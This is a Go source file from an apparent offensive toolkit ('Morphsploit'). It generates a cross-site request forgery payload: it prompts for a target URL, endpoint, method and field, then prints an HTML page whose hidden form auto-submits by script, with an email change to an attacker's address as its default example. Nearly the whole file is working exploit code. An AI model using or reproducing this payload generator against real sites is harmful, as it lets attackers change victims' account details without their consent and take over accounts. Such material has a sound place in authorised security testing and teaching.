package csrf

import (
	"fmt"
	"github.com/MohakGupta2004/Morphsploit/utils"
)

func NoDefense() {
	var url string
	var endpoint string
	var method string

	payload := "email"
	payloadValue := "attacker@email.com"
	fmt.Printf("Enter the url: ")
	fmt.Scanf("%s", &url)

	fmt.Printf("Exploit endpoint (provide in \"/change-email\" in this format): ")
	fmt.Scanf("%s", &endpoint)
	validEndpoint := utils.EndpointSyntaxCheck(endpoint)
	if validEndpoint == false {
		fmt.Println("Provide valid endpoint")
		return
	}
	fmt.Printf("Attack Method(GET/POST, default=GET): ")
	fmt.Scanf("%s", &method)

	if method == "" {
		method = "GET"
	}
	validMethod := utils.HttpMethodCheck(method)
	if validMethod == false {
		fmt.Println("Method doesn't exist")
		return
	}
	fmt.Printf("Payload name (example:email, username. Provide field only): ")
	fmt.Scanf("%s", &payload)

	fmt.Printf("Payload value (example:attacker@email.com, username=mohak. Provide value): ")
	fmt.Scanf("%s", &payloadValue)

	fmt.Println("-------------------------------------------------------")
	fmt.Println("Your payload: ")
	fmt.Printf(`
<html>
  <body>
    <form action="%s%s" method=%s>
      <input type="hidden" name=%s value=%s />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
	`, url, endpoint, method, payload, payloadValue)

	fmt.Printf("-------------------------------------------------------")
}
